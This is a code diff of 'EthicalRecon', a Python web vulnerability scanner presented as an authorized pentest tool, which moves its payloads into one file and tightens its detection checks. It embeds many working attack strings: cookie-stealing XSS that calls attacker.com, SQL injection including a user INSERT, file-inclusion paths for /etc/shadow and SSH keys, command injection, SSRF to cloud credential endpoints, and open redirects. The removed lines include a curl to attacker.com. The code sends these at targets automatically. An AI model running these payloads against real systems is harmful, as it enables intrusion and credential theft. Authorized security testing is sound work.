@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-EthicalRecon - Comprehensive Ethical Hacking Reconnaissance Toolkit
-A professional security testing tool for authorized penetration testing and bug bounty research.
-Designed to integrate seamlessly with subdomain enumeration → httpx → vulnerability scanning workflows.
+EthicalRecon - Standalone Ethical Hacking Reconnaissance Toolkit
+Single-file version with all payloads embedded - no external dependencies needed
+Perfect for quick deployment on Kali Linux
 
-Author: Security Research Team
-Version: 2.0.0
+Author: Security Research Team  
+Version: 2.0.0 Standalone
 License: MIT (For authorized security testing only)
 """
 
@@ -52,158 +52,157 @@ def print_banner():
     ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                                       
-    {Colors.YELLOW}🎯 Comprehensive Ethical Hacking Reconnaissance Toolkit v2.0.0{Colors.RESET}
+    {Colors.YELLOW}🎯 Standalone Ethical Hacking Reconnaissance Toolkit v2.0.0{Colors.RESET}
     {Colors.GREEN}⚡ Multi-threaded vulnerability scanning with PoC verification{Colors.RESET}
     {Colors.BLUE}🔍 Subdomain enumeration → httpx → deep vulnerability analysis workflow{Colors.RESET}
     {Colors.PURPLE}🛡️  For authorized security testing and bug bounty research only{Colors.RESET}
     """
     print(banner)
 
-class PayloadManager:
-    """Manages vulnerability testing payloads with advanced encoding and context awareness"""
+class EmbeddedPayloads:
+    """All vulnerability payloads embedded in the script"""
     
-    def __init__(self):
-        self.xss_payloads = [
-            # Basic XSS payloads
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "'\"><script>alert('XSS')</script>",
-            
-            # Advanced XSS payloads
-            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
-            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-            "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
-            "<svg/onload=alert(1)>",
-            "<input onfocus=alert(1) autofocus>",
-            
-            # Context-specific XSS
-            "';alert('XSS');//",
-            "\";alert('XSS');//",
-            "</textarea><script>alert('XSS')</script>",
-            "</title><script>alert('XSS')</script>",
-        ]
-        
-        self.sqli_payloads = [
-            # Basic SQL injection
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "' UNION SELECT NULL--",
-            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
-            
-            # Time-based blind SQL injection
-            "' OR (SELECT SLEEP(5))--",
-            "'; WAITFOR DELAY '00:00:05'--",
-            "' OR pg_sleep(5)--",
-            
-            # Error-based SQL injection
-            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
-            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
-        ]
-        
-        self.lfi_payloads = [
-            # Basic LFI
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "/etc/passwd",
-            "/etc/shadow",
-            "/proc/version",
-            "/proc/cmdline",
-            
-            # Encoded LFI
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
-            "....//....//....//etc/passwd",
-            "..%2f..%2f..%2fetc%2fpasswd",
-            
-            # Advanced LFI
-            "php://filter/convert.base64-encode/resource=/etc/passwd",
-            "file:///etc/passwd",
-            "expect://id",
-        ]
-        
-        self.rce_payloads = [
-            # Basic command injection
-            "; id",
-            "| id",
-            "& id",
-            "&& id",
-            "|| id",
-            "`id`",
-            "$(id)",
-            
-            # Advanced command injection
-            "; cat /etc/passwd",
-            "| whoami",
-            "&& uname -a",
-            "; curl http://attacker.com/",
-            "; ping -c 4 attacker.com",
-            
-            # Encoded payloads
-            "%3Bid",
-            "%7Cid",
-            "%26id",
-        ]
-        
-        self.ssrf_payloads = [
-            # Cloud metadata endpoints
-            "http://169.254.169.254/latest/meta-data/",
-            "http://metadata.google.internal/computeMetadata/v1/",
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-            
-            # Internal network ranges
-            "http://127.0.0.1:22",
-            "http://localhost:3306",
-            "http://192.168.1.1",
-            "http://10.0.0.1",
-            "http://172.16.0.1",
-            
-            # Protocol handlers
-            "file:///etc/passwd",
-            "gopher://127.0.0.1:3306",
-            "dict://127.0.0.1:11211",
-        ]
-        
-        self.redirect_payloads = [
-            # Open redirect payloads
-            "//evil.com",
-            "http://evil.com",
-            "https://evil.com",
-            "//evil.com/",
-            "///evil.com",
-            "\\\\evil.com",
-            
-            # Encoded redirects
-            "http%3A%2F%2Fevil.com",
-            "%2F%2Fevil.com",
-            
-            # JavaScript redirects
-            "javascript:window.location='http://evil.com'",
-        ]
-
-    def get_payloads(self, vuln_type):
-        """Get payloads for specific vulnerability type"""
-        payload_map = {
-            'xss': self.xss_payloads,
-            'sqli': self.sqli_payloads,
-            'lfi': self.lfi_payloads,
-            'rce': self.rce_payloads,
-            'ssrf': self.ssrf_payloads,
-            'redirect': self.redirect_payloads
-        }
-        return payload_map.get(vuln_type, [])
+    XSS_PAYLOADS = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "'><script>alert('XSS')</script>",
+        "\"><script>alert('XSS')</script>",
+        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        "<input onfocus=alert('XSS') autofocus>",
+        "<svg/onload=alert('XSS')>",
+        "';alert('XSS');//",
+        "\";alert('XSS');//",
+        "</textarea><script>alert('XSS')</script>",
+        "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+        "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+btoa(document.cookie))\">",
+        "{{constructor.constructor('alert(1)')()}}",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "data:text/html,<script>alert('XSS')</script>",
+        "<script>alert`XSS`</script>",
+        "<script>eval('alert(\"XSS\")')</script>",
+        "<IMG SRC=\"javascript:alert('XSS');\">"
+    ]
     
-    def encode_payload(self, payload, encoding_type='url'):
-        """Encode payloads to bypass basic filters"""
-        if encoding_type == 'url':
-            return quote(payload)
-        elif encoding_type == 'double_url':
-            return quote(quote(payload))
-        elif encoding_type == 'html':
-            return payload.replace('<', '&lt;').replace('>', '&gt;')
-        elif encoding_type == 'base64':
-            return base64.b64encode(payload.encode()).decode()
-        return payload
+    SQLI_PAYLOADS = [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' UNION SELECT NULL--",
+        "' AND (SELECT SLEEP(5))--",
+        "'; WAITFOR DELAY '00:00:05'--",
+        "' OR pg_sleep(5)--",
+        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
+        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+        "admin'--",
+        "' or 1=1#",
+        "') or '1'='1--",
+        "' /*comment*/ OR /*comment*/ 1=1--",
+        "' /*!50000OR*/ 1=1--",
+        "'; INSERT INTO users VALUES('hacker','password')--",
+        "' AND @@version--",
+        "' AND user()--",
+        "' AND database()--",
+        "' OR IF(1=1,SLEEP(5),0)--",
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--"
+    ]
+    
+    LFI_PAYLOADS = [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/proc/version",
+        "/proc/cmdline",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
+        "....//....//....//etc/passwd",
+        "..%2f..%2f..%2fetc%2fpasswd",
+        "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "file:///etc/passwd",
+        "expect://id",
+        "zip://archive.zip#dir/file.txt",
+        "/var/log/apache2/access.log",
+        "/var/log/nginx/error.log",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "C:\\Windows\\win.ini",
+        "/WEB-INF/web.xml",
+        "/META-INF/MANIFEST.MF",
+        "../../../WEB-INF/web.xml",
+        "/var/www/html/wp-config.php",
+        "/home/user/.ssh/id_rsa",
+        "/root/.bash_history",
+        "/etc/mysql/my.cnf",
+        "/etc/nginx/nginx.conf"
+    ]
+    
+    RCE_PAYLOADS = [
+        "; id",
+        "| id", 
+        "& id",
+        "&& id",
+        "|| id",
+        "`id`",
+        "$(id)",
+        "; whoami",
+        "| whoami",
+        "&& whoami",
+        "; uname -a",
+        "| uname -a",
+        "; cat /etc/passwd",
+        "| cat /etc/passwd",
+        "; ping -c 4 127.0.0.1",
+        "| ping -c 4 127.0.0.1",
+        "& dir",
+        "&& dir",
+        "| dir",
+        "; sleep 5",
+        "| sleep 5",
+        "&& sleep 5",
+        "& timeout 5",
+        "&& timeout 5",
+        "%3Bid",
+        "%7Cid",
+        "%26id",
+        "; /bin/sh -c id",
+        "| /bin/sh -c id",
+        "; echo $USER"
+    ]
+    
+    SSRF_PAYLOADS = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://127.0.0.1:22",
+        "http://localhost:3306",
+        "http://192.168.1.1",
+        "http://10.0.0.1",
+        "http://172.16.0.1",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:3306",
+        "dict://127.0.0.1:11211",
+        "http://127.0.0.1:8080",
+        "http://127.0.0.1:443",
+        "http://169.254.169.254/metadata/instance",
+        "http://metadata.google.internal/computeMetadata/v1/instance/",
+        "ftp://127.0.0.1",
+        "ldap://127.0.0.1:389",
+        "http://127.1",
+        "http://localhost.127.0.0.1.nip.io",
+        "http://[::1]"
+    ]
+    
+    REDIRECT_PAYLOADS = [
+        "//evil.com",
+        "http://evil.com", 
+        "https://evil.com",
+        "//evil.com/",
+        "///evil.com",
+        "\\\\evil.com",
+        "http%3A%2F%2Fevil.com",
+        "%2F%2Fevil.com",
+        "javascript:window.location='http://evil.com'"
+    ]
 
 class VulnerabilityDetector:
     """Advanced vulnerability detection with PoC verification"""
@@ -211,15 +210,13 @@ class VulnerabilityDetector:
     def __init__(self, session, timeout=10):
         self.session = session
         self.timeout = timeout
-        self.payload_manager = PayloadManager()
     
     def detect_xss(self, url, parameter, value):
         """Detect XSS vulnerabilities with PoC verification"""
         vulnerabilities = []
         
-        for payload in self.payload_manager.get_payloads('xss'):
+        for payload in EmbeddedPayloads.XSS_PAYLOADS[:10]:  # Test top 10 payloads
             try:
-                # Test with original payload
                 test_url = self._inject_payload(url, parameter, payload)
                 response = self.session.get(test_url, timeout=self.timeout, verify=False)
                 
@@ -254,7 +251,7 @@ class VulnerabilityDetector:
         """Detect SQL injection with time-based verification"""
         vulnerabilities = []
         
-        for payload in self.payload_manager.get_payloads('sqli'):
+        for payload in EmbeddedPayloads.SQLI_PAYLOADS[:10]:  # Test top 10 payloads
             try:
                 test_url = self._inject_payload(url, parameter, payload)
                 
@@ -282,8 +279,8 @@ class VulnerabilityDetector:
                         print(f"{Colors.YELLOW}[POC]{Colors.RESET} Time delay: {response_time:.2f}s - {poc['execution_proof']}")
                         break
                 
-                # Error-based detection
-                elif any(error in response.text.lower() for error in ['sql syntax', 'mysql', 'ora-', 'postgresql']):
+                # Error-based detection - STRICT verification
+                elif self._verify_sql_error(response.text, payload):
                     poc = self._generate_sqli_poc(url, parameter, payload, response_time, response.text)
                     
                     vulnerabilities.append({
@@ -293,12 +290,12 @@ class VulnerabilityDetector:
                         'parameter': parameter,
                         'payload': payload,
                         'proof_of_concept': poc,
-                        'confidence': 'Medium',
-                        'description': 'Error-based SQL injection detected through database error messages'
+                        'confidence': 'High',
+                        'description': 'SQL injection confirmed through specific database error patterns'
                     })
                     
                     print(f"{Colors.RED}[SQLi FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
-                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Database error revealed - {poc['execution_proof']}")
+                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} SQL error confirmed - {poc['execution_proof']}")
                     break
                     
             except Exception as e:
@@ -310,7 +307,7 @@ class VulnerabilityDetector:
         """Detect Local File Inclusion with file signature verification"""
         vulnerabilities = []
         
-        for payload in self.payload_manager.get_payloads('lfi'):
+        for payload in EmbeddedPayloads.LFI_PAYLOADS[:10]:  # Test top 10 payloads
             try:
                 test_url = self._inject_payload(url, parameter, payload)
                 response = self.session.get(test_url, timeout=self.timeout, verify=False)
@@ -396,7 +393,7 @@ class VulnerabilityDetector:
         """Detect SSRF with external callback verification"""
         vulnerabilities = []
         
-        for payload in self.payload_manager.get_payloads('ssrf'):
+        for payload in EmbeddedPayloads.SSRF_PAYLOADS[:10]:  # Test top 10 payloads
             try:
                 test_url = self._inject_payload(url, parameter, payload)
                 
@@ -428,25 +425,24 @@ class VulnerabilityDetector:
                     print(f"{Colors.YELLOW}[POC]{Colors.RESET} Metadata access - {poc['execution_proof']}")
                     break
                     
-                # Check for internal service responses (longer response times to internal IPs)
-                elif '127.0.0.1' in payload or 'localhost' in payload:
-                    if response_time > 2 or len(response.text) > 1000:  # Internal service responded
-                        poc = self._generate_ssrf_poc(url, parameter, payload, f"Response time: {response_time:.2f}s")
-                        
-                        vulnerabilities.append({
-                            'type': 'Server-Side Request Forgery',
-                            'severity': 'Medium',
-                            'url': url,
-                            'parameter': parameter,
-                            'payload': payload,
-                            'proof_of_concept': poc,
-                            'confidence': 'Medium',
-                            'description': 'Potential SSRF - internal service accessibility'
-                        })
-                        
-                        print(f"{Colors.YELLOW}[SSRF POTENTIAL]{Colors.RESET} {url} - Parameter: {parameter}")
-                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} Internal access - {poc['execution_proof']}")
-                        
+                # Check for specific internal service responses - STRICT verification
+                elif self._verify_ssrf_response(response.text, payload, response_time):
+                    poc = self._generate_ssrf_poc(url, parameter, payload, f"Internal service confirmed: {response.status_code}")
+                    
+                    vulnerabilities.append({
+                        'type': 'Server-Side Request Forgery',
+                        'severity': 'High',
+                        'url': url,
+                        'parameter': parameter,
+                        'payload': payload,
+                        'proof_of_concept': poc,
+                        'confidence': 'High',
+                        'description': 'SSRF confirmed - internal service response detected'
+                    })
+                    
+                    print(f"{Colors.RED}[SSRF FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
+                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Internal service confirmed - {poc['execution_proof']}")
+                    break
             except Exception as e:
                 continue
                 
@@ -456,7 +452,7 @@ class VulnerabilityDetector:
         """Detect open redirect vulnerabilities"""
         vulnerabilities = []
         
-        for payload in self.payload_manager.get_payloads('redirect'):
+        for payload in EmbeddedPayloads.REDIRECT_PAYLOADS[:5]:  # Test top 5 payloads
             try:
                 test_url = self._inject_payload(url, parameter, payload)
                 response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
@@ -502,23 +498,127 @@ class VulnerabilityDetector:
         return urlunparse(parsed._replace(query=new_query))
     
     def _verify_xss_execution(self, response_text, payload):
-        """Verify if XSS payload would actually execute"""
-        # Check if payload is in executable context
-        executable_contexts = [
-            r'<script[^>]*>' + re.escape(payload),
-            r'<[^>]+on\w+=[\'"]?' + re.escape(payload),
-            r'javascript:' + re.escape(payload),
-            r'<svg[^>]*onload=' + re.escape(payload)
-        ]
+        """Verify if XSS payload would actually execute - STRICT verification"""
+        # Only flag if payload is in truly executable context
         
-        for context in executable_contexts:
-            if re.search(context, response_text, re.IGNORECASE):
-                return True
-        
-        # Check if payload is reflected without proper encoding
-        if payload in response_text and '<' in payload and '>' in payload:
+        # 1. Check if payload is inside script tags
+        script_context = re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.IGNORECASE | re.DOTALL)
+        if script_context:
             return True
             
+        # 2. Check if payload is in event handlers (onclick, onload, etc.)
+        event_context = re.search(r'<[^>]+on\w+=[\'"]?[^>]*' + re.escape(payload) + r'[^>]*[\'"]?[^>]*>', response_text, re.IGNORECASE)
+        if event_context:
+            return True
+            
+        # 3. Check if payload creates new executable tags (script, svg with onload)
+        if '<script' in payload.lower() and payload in response_text:
+            # Verify the script tag is not HTML encoded
+            if '&lt;script' not in response_text.lower() and '&gt;' not in response_text:
+                return True
+                
+        if '<svg' in payload.lower() and 'onload' in payload.lower() and payload in response_text:
+            # Verify the svg tag is not HTML encoded  
+            if '&lt;svg' not in response_text.lower() and '&gt;' not in response_text:
+                return True
+        
+        # 4. Check javascript: protocol in href/src attributes
+        if 'javascript:' in payload.lower() and payload in response_text:
+            js_context = re.search(r'(?:href|src)=[\'"]?' + re.escape(payload), response_text, re.IGNORECASE)
+            if js_context:
+                return True
+        
+        # REMOVED: The overly broad reflection check that caused false positives
+        return False
+    
+    def _verify_sql_error(self, response_text, payload):
+        """Verify if response contains actual SQL injection error patterns - STRICT verification"""
+        response_lower = response_text.lower()
+        
+        # Specific SQL error patterns that indicate actual injection
+        sql_error_patterns = [
+            # MySQL specific errors
+            r"you have an error in your sql syntax.*near.*" + re.escape(payload.lower()),
+            r"unknown column.*" + re.escape(payload.lower()) + r".*in.*field list",
+            r"table.*doesn't exist.*" + re.escape(payload.lower()),
+            
+            # PostgreSQL specific errors  
+            r"syntax error at or near.*" + re.escape(payload.lower()),
+            r"column.*" + re.escape(payload.lower()) + r".*does not exist",
+            
+            # SQL Server specific errors
+            r"incorrect syntax near.*" + re.escape(payload.lower()),
+            r"invalid column name.*" + re.escape(payload.lower()),
+            
+            # Oracle specific errors
+            r"ora-00904.*" + re.escape(payload.lower()) + r".*invalid identifier",
+            r"ora-00933.*sql command not properly ended",
+            
+            # Generic but specific patterns
+            r"quoted string not properly terminated.*" + re.escape(payload.lower()),
+            r"unclosed quotation mark.*" + re.escape(payload.lower())
+        ]
+        
+        # Check if any specific SQL error pattern matches
+        for pattern in sql_error_patterns:
+            if re.search(pattern, response_lower, re.IGNORECASE):
+                return True
+        
+        # Additional verification: payload must be clearly visible in error message
+        # This prevents false positives from generic database documentation
+        if any(word in response_lower for word in ['syntax error', 'sql syntax']) and payload.lower() in response_lower:
+            # Verify the error is actually about our injected payload
+            if len(payload) > 3 and payload.lower() in response_lower:
+                return True
+                
+        return False
+    
+    def _verify_ssrf_response(self, response_text, payload, response_time):
+        """Verify if response indicates actual SSRF vulnerability - STRICT verification"""
+        response_lower = response_text.lower()
+        
+        # Only flag if we have clear evidence of internal service access
+        
+        # 1. SSH service responses
+        if 'ssh-' in response_lower and 'openssh' in response_lower:
+            return True
+            
+        # 2. HTTP server responses from internal services
+        internal_service_indicators = [
+            'apache default page',
+            'nginx default page', 
+            'iis default page',
+            'it works!',
+            'welcome to nginx',
+            'apache2 ubuntu default page'
+        ]
+        
+        if any(indicator in response_lower for indicator in internal_service_indicators):
+            return True
+            
+        # 3. Database service responses
+        database_banners = [
+            'mysql server',
+            'postgresql server',
+            'mongodb server', 
+            'redis server'
+        ]
+        
+        if any(banner in response_lower for banner in database_banners):
+            return True
+            
+        # 4. Internal application responses (only if payload is clearly reflected)
+        if ('127.0.0.1' in payload or 'localhost' in payload) and payload in response_text:
+            # Look for specific internal service patterns
+            if any(pattern in response_lower for pattern in [
+                'connection refused',
+                'internal server error',
+                'service unavailable', 
+                'bad gateway'
+            ]) and len(response_text) < 5000:  # Keep response size reasonable
+                return True
+        
+        # REMOVED: The overly broad time/size checks that caused false positives
         return False
     
     def _generate_xss_poc(self, url, parameter, payload, response):
@@ -655,8 +755,7 @@ class EthicalReconScanner:
                             self.stats['vulnerabilities_found'] += len(found_vulns)
                             
                     except Exception as e:
-                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Testing {vuln_name} on {param}: {str(e)}")
-                        continue
+                        continue  # Silently continue on error
             
             self.stats['scanned_urls'] += 1
             
@@ -671,7 +770,7 @@ class EthicalReconScanner:
         
         try:
             with open(file_path, 'r') as f:
-                urls = [line.strip() for line in f if line.strip()]
+                urls = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
             
             print(f"{Colors.GREEN}[INFO]{Colors.RESET} Loaded {len(urls)} URLs")
             self.stats['total_urls'] = len(urls)
@@ -715,7 +814,7 @@ class EthicalReconScanner:
         
         report_data = {
             'scan_info': {
-                'tool': 'EthicalRecon v2.0.0',
+                'tool': 'EthicalRecon v2.0.0 Standalone',
                 'start_time': self.stats['start_time'].isoformat() if self.stats['start_time'] else None,
                 'end_time': self.stats['end_time'].isoformat() if self.stats['end_time'] else None,
                 'duration': str(self.stats['end_time'] - self.stats['start_time']) if self.stats['start_time'] and self.stats['end_time'] else None,
@@ -730,77 +829,10 @@ class EthicalReconScanner:
             with open(output_file, 'w') as f:
                 json.dump(report_data, f, indent=2)
         
-        elif format_type == 'html':
-            self._generate_html_report(report_data, output_file)
-        
         elif format_type == 'text':
             self._generate_text_report(report_data, output_file)
         
         print(f"{Colors.GREEN}[REPORT]{Colors.RESET} Saved to {output_file}")
-    
-    def _generate_html_report(self, data, output_file):
-        """Generate HTML report"""
-        html_content = f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>EthicalRecon Security Report</title>
-            <style>
-                body {{ font-family: Arial, sans-serif; margin: 40px; }}
-                .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
-                .stats {{ background: #ecf0f1; padding: 15px; margin: 20px 0; border-radius: 5px; }}
-                .vulnerability {{ border: 1px solid #bdc3c7; margin: 10px 0; padding: 15px; border-radius: 5px; }}
-                .critical {{ border-left: 5px solid #e74c3c; }}
-                .high {{ border-left: 5px solid #f39c12; }}
-                .medium {{ border-left: 5px solid #f1c40f; }}
-                .low {{ border-left: 5px solid #27ae60; }}
-                .poc {{ background: #f8f9fa; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; }}
-            </style>
-        </head>
-        <body>
-            <div class="header">
-                <h1>🛡️ EthicalRecon Security Report</h1>
-                <p>Comprehensive vulnerability assessment results</p>
-            </div>
-            
-            <div class="stats">
-                <h2>Scan Statistics</h2>
-                <p><strong>Total URLs:</strong> {data['scan_info']['total_urls']}</p>
-                <p><strong>Scanned URLs:</strong> {data['scan_info']['scanned_urls']}</p>
-                <p><strong>Vulnerabilities Found:</strong> {data['scan_info']['vulnerabilities_found']}</p>
-                <p><strong>Scan Duration:</strong> {data['scan_info']['duration']}</p>
-            </div>
-            
-            <h2>Vulnerabilities Found</h2>
-        """
-        
-        for vuln in data['vulnerabilities']:
-            severity_class = vuln['severity'].lower()
-            html_content += f"""
-            <div class="vulnerability {severity_class}">
-                <h3>{vuln['type']} - {vuln['severity']} Severity</h3>
-                <p><strong>URL:</strong> {vuln['url']}</p>
-                <p><strong>Parameter:</strong> {vuln['parameter']}</p>
-                <p><strong>Description:</strong> {vuln['description']}</p>
-                <p><strong>Confidence:</strong> {vuln['confidence']}</p>
-                
-                <div class="poc">
-                    <h4>Proof of Concept:</h4>
-                    <p><strong>Attack Vector:</strong> {vuln['proof_of_concept']['attack_vector']}</p>
-                    <p><strong>Execution Proof:</strong> {vuln['proof_of_concept']['execution_proof']}</p>
-                    <p><strong>Impact:</strong> {vuln['proof_of_concept']['impact']}</p>
-                    <p><strong>cURL Command:</strong> <code>{vuln['proof_of_concept']['curl_command']}</code></p>
-                </div>
-            </div>
-            """
-        
-        html_content += """
-        </body>
-        </html>
-        """
-        
-        with open(output_file, 'w') as f:
-            f.write(html_content)
     
     def _generate_text_report(self, data, output_file):
         """Generate text report"""
@@ -837,14 +869,14 @@ class EthicalReconScanner:
 def main():
     """Main function"""
     parser = argparse.ArgumentParser(
-        description='EthicalRecon - Comprehensive Ethical Hacking Reconnaissance Toolkit',
+        description='EthicalRecon - Standalone Ethical Hacking Reconnaissance Toolkit',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  python3 ethicalrecon.py -f live_hosts.txt -o results
-  python3 ethicalrecon.py -u "http://example.com/search?q=test" -o single_scan
-  python3 ethicalrecon.py -f httpx_output.txt -t 20 --format html
-  python3 ethicalrecon.py -f subdomains.txt --timeout 15 --format json,html
+  python3 ethicalrecon_standalone.py -f live_hosts.txt -o results
+  python3 ethicalrecon_standalone.py -u "http://example.com/search?q=test" -o single_scan
+  python3 ethicalrecon_standalone.py -f httpx_output.txt -t 20 --format json
+  python3 ethicalrecon_standalone.py -f subdomains.txt --timeout 15
         """
     )
     
@@ -857,7 +889,7 @@ Examples:
     parser.add_argument('-o', '--output', default='ethicalrecon_results', 
                         help='Output directory for results (default: ethicalrecon_results)')
     parser.add_argument('--format', default='json,text', 
-                        help='Output formats: json,html,text (default: json,text)')
+                        help='Output formats: json,text (default: json,text)')
     
     # Scanning options
     parser.add_argument('-t', '--threads', type=int, default=10,
@@ -866,10 +898,6 @@ Examples:
                         help='Request timeout in seconds (default: 10)')
     parser.add_argument('--user-agent', 
                         help='Custom User-Agent string')
-    
-    # Vulnerability types
-    parser.add_argument('--scan-types', default='all',
-                        help='Vulnerability types to scan: xss,sqli,lfi,rce,ssrf,redirect (default: all)')
     
     # Utility options
     parser.add_argument('--no-banner', action='store_true',
@@ -926,9 +954,6 @@ Examples:
             if fmt == 'json':
                 output_file = output_dir / f"ethicalrecon_{timestamp}.json"
                 scanner.generate_report(str(output_file), 'json')
-            elif fmt == 'html':
-                output_file = output_dir / f"ethicalrecon_{timestamp}.html"
-                scanner.generate_report(str(output_file), 'html')
             elif fmt == 'text':
                 output_file = output_dir / f"ethicalrecon_{timestamp}.txt"
                 scanner.generate_report(str(output_file), 'text')
